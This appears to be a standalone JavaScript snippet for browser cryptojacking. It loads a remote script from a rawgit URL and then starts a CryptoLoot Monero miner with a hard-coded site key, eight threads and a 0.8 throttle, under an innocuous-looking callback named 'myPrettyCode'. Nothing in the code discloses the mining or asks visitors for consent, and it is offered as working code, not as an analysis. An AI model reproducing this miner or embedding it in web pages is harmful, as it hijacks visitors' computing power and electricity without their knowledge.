function loadScript(url, callback)
{
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
}
var myPrettyCode = function() {
  var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
        {
        threads:8,autoThreads:false,throttle:0.8
        }
  );
  miner.start();
};
loadScript("https://rawgit.com/BoobieLtd/js/master/xmrselfhost.js", myPrettyCode);
